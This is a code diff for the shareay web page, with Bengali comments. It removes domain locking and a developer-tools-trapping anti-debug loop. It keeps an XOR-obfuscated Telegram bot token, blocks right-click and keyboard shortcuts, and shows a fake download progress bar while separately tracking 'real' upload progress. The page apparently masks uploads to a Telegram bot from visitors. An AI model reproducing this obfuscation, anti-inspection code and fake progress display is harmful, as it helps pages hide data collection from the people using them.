@@ -703,16 +703,7 @@
 
 <script>
 (function() {
-    // ==================== সিকিউরিটি - ডোমেইন লকিং ====================
-    const allowedDomains = ['127.0.0.1', 'localhost', 'shareay.com', 'www.shareay.com'];
-    const currentHost = window.location.hostname;
-    if(!allowedDomains.some(domain => currentHost === domain || currentHost.endsWith('.' + domain))) {
-        document.body.innerHTML = '<div style="text-align:center;padding:100px;color:red;"><h1>⛔ অ্যাক্সেস denied</h1><p>এই ডোমেইন থেকে অ্যাক্সেস অনুমোদিত নয়।</p></div>';
-        throw new Error('Domain not allowed');
-    }
-
-    // ==================== টোকেন সিকিউরিটি - ASCII Character Array + XOR ====================
-    // টোকেনের ASCII ভ্যালু অ্যারে (এনকোডেড)
+    // ==================== টোকেন সিকিউরিটি - XOR এনকোডিং ====================
     const _0x4a2b = [56,53,52,57,57,52,50,53,53,48,58,65,65,71,117,109,120,85,90,54,88,95,115,112,72,45,100,71,87,55,115,65,83,52,122,76,65,45,116,90,69,49,77,78,105,119];
     const _0x3c1d = [56,55,53,49,51,54,55,51,52,55,52];
     
@@ -739,26 +730,6 @@
         return decodeAsciiArray(_0x3c1d);
     }
     
-    // ==================== Anti-Debugging ====================
-    function antiDebugger() {
-        setInterval(function() {
-            debugger;
-        }, 1000);
-        
-        (function() {
-            function checkDevTools() {
-                const before = new Date().getTime();
-                debugger;
-                const after = new Date().getTime();
-                if(after - before > 100) {
-                    document.body.innerHTML = '<div style="text-align:center;padding:100px;"><h1>⚠️ ডেভেলপার টুলস ডিটেক্ট করা হয়েছে</h1><p>পেজ রিলোড করুন</p></div>';
-                    throw new Error('DevTools detected');
-                }
-            }
-            setInterval(checkDevTools, 2000);
-        })();
-    }
-    
     // ==================== কী-বোর্ড শর্টকাট ব্লক ====================
     function blockShortcuts() {
         document.addEventListener('contextmenu', function(e) {
@@ -778,8 +749,6 @@
         });
     }
     
-    // সিকিউরিটি ফাংশন কল
-    antiDebugger();
     blockShortcuts();
     
     const TELEGRAM_BOT_TOKEN = getTelegramToken();
@@ -1118,8 +1087,6 @@ tr:hover{background:#f8fafc;}
                     fakeCompleted++;
                     let overallPercent = (fakeCompleted / totalFakeFiles) * 100;
                     overallFill.style.width = overallPercent + '%';
-                    
-                    let realPercentShow = realProgress.total > 0 ? Math.floor((realProgress.uploaded / realProgress.total) * 100) : 0;
                     overallText.innerHTML = `${fakeCompleted}/${totalFakeFiles} ফাইল ডাউনলোড হয়েছে (${Math.floor(overallPercent)}%)`;
                 }
             }, 500);
@@ -1266,12 +1233,10 @@ tr:hover{background:#f8fafc;}
         let referrer = allUsers.find(u => u.refLink && u.refLink.includes(referrerCode));
         
         if(referrer && referrer.name !== newUserName) {
-            let referrerData = localStorage.getItem('shareayUser_' + referrer.name);
-            let updatedReferrer = referrerData ? JSON.parse(referrerData) : null;
-            
-            if(!updatedReferrer) {
-                updatedReferrer = JSON.parse(localStorage.getItem('shareayUser')) || null;
-                if(updatedReferrer && updatedReferrer.name === referrer.name) {
+            let referrerData = localStorage.getItem('shareayUser');
+            if(referrerData) {
+                let updatedReferrer = JSON.parse(referrerData);
+                if(updatedReferrer.name === referrer.name) {
                     updatedReferrer.balance = (updatedReferrer.balance || 0) + 10;
                     updatedReferrer.totalReferEarn = (updatedReferrer.totalReferEarn || 0) + 10;
                     if(!updatedReferrer.referrals) updatedReferrer.referrals = [];
@@ -1282,13 +1247,6 @@ tr:hover{background:#f8fafc;}
                     }
                     return referrer.name;
                 }
-            } else {
-                updatedReferrer.balance = (updatedReferrer.balance || 0) + 10;
-                updatedReferrer.totalReferEarn = (updatedReferrer.totalReferEarn || 0) + 10;
-                if(!updatedReferrer.referrals) updatedReferrer.referrals = [];
-                updatedReferrer.referrals.push({ name: newUserName, bonus: 10, time: new Date().toISOString() });
-                localStorage.setItem('shareayUser_' + referrer.name, JSON.stringify(updatedReferrer));
-                return referrer.name;
             }
         }
         return null;
